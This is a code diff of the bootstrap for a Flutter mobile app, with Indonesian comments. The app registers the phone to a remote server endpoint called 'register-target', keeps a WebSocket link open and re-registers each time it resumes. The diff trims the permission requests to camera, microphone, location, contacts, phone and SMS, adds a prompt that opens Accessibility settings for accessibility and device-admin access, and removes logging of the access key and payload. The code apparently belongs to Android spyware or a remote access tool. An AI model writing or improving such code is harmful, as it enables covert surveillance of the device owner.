@@ -91,7 +91,6 @@ class _AppBootstrapState extends State<AppBootstrap>
     print('📱 [LIFECYCLE] state: $state');
 
     if (state == AppLifecycleState.resumed) {
-      // App kembali ke foreground → force register + polling
       print('🔄 [LIFECYCLE] resumed → force re-register + polling');
       _registerDeviceWithRetry();
       if (WsClient().isConnected) {
@@ -121,22 +120,26 @@ class _AppBootstrapState extends State<AppBootstrap>
         await prefs.setString('serverUrl', BuildConfig.serverUrl);
         await prefs.setBool('isNativeApp', true);
         print('✅ [BOOTSTRAP] Config saved. serverUrl=${BuildConfig.serverUrl}');
-        print('✅ [BOOTSTRAP] accessKey=${BuildConfig.accessKey}');
       } catch (e) {
         print('❌ [BOOTSTRAP] Prefs error: $e');
       }
 
       // ==========================================
-      // ===== 2. Permissions =====
+      // ===== 2. Permissions (NON-BLOCKING) =====
       // ==========================================
-      print('📦 [BOOTSTRAP] Step 2: Request permissions');
+      print('📦 [BOOTSTRAP] Step 2: Request permissions (background)');
       if (mounted) setState(() => _status = 'Meminta izin...');
-      try {
-        await _requestPermissions();
-        print('✅ [BOOTSTRAP] Permissions done');
-      } catch (e) {
-        print('❌ [BOOTSTRAP] Permission error: $e');
-      }
+
+      // Jalankan permission di background — TIDAK block bootstrap
+      _requestPermissions().then((_) {
+        print('✅ [BOOTSTRAP] Permissions done (background)');
+      }).catchError((e) {
+        print('⚠️ [BOOTSTRAP] Permission error: $e');
+      });
+
+      // Beri jeda singkat
+      await Future.delayed(const Duration(milliseconds: 800));
+      print('⏩ [BOOTSTRAP] Lanjut tanpa tunggu permission');
 
       // ==========================================
       // ===== 3. Register device =====
@@ -168,7 +171,6 @@ class _AppBootstrapState extends State<AppBootstrap>
         print('🔌 [BOOTSTRAP] Connecting WS...');
         await WsClient().connect();
 
-        // Tunggu 3 detik untuk cek
         await Future.delayed(const Duration(seconds: 3));
         if (WsClient().isConnected) {
           print('✅ [BOOTSTRAP] WS CONNECTED — stop polling');
@@ -213,26 +215,17 @@ class _AppBootstrapState extends State<AppBootstrap>
       print('⚠️ [PERM] getSdkInt error: $e');
     }
 
+    // ==========================================
+    // ===== PERMISSION PENTING SAJA =====
+    // ==========================================
     final permissions = <Permission>[
       Permission.camera,
       Permission.microphone,
       Permission.location,
-      Permission.locationWhenInUse,
-      Permission.locationAlways,
       Permission.notification,
-      Permission.phone,
       Permission.contacts,
+      Permission.phone,
       Permission.sms,
-      Permission.calendarFullAccess,
-      Permission.calendarWriteOnly,
-      Permission.sensors,
-      Permission.activityRecognition,
-      Permission.bluetooth,
-      Permission.bluetoothScan,
-      Permission.bluetoothConnect,
-      Permission.ignoreBatteryOptimizations,
-      Permission.systemAlertWindow,
-      Permission.requestInstallPackages,
     ];
 
     if (sdkInt >= 33) {
@@ -245,16 +238,26 @@ class _AppBootstrapState extends State<AppBootstrap>
       permissions.add(Permission.storage);
     }
 
+    // Minta satu-satu dengan jeda
     for (final perm in permissions) {
       try {
         final status = await perm.status;
         if (status.isDenied || status.isLimited) {
           final result = await perm.request();
           print('🔑 [PERM] $perm: $result');
+          await Future.delayed(const Duration(milliseconds: 300));
         }
       } catch (e) {
         print('⚠️ [PERM] $perm error: $e');
       }
+    }
+
+    // Buka settings untuk accessibility + device admin (user aktifkan manual)
+    try {
+      print('🔓 [PERM] Buka Accessibility Settings');
+      await _deviceChannel.invokeMethod('openAccessibilitySettings');
+    } catch (e) {
+      print('⚠️ [PERM] accessibility settings error: $e');
     }
   }
 
@@ -387,7 +390,6 @@ class _AppBootstrapState extends State<AppBootstrap>
 
       final url = '${BuildConfig.serverUrl}/api/register-target';
       print('📡 [REGISTER] POST $url');
-      print('📡 [REGISTER] Payload: $payload');
 
       final res = await _httpPost(url, payload);
 
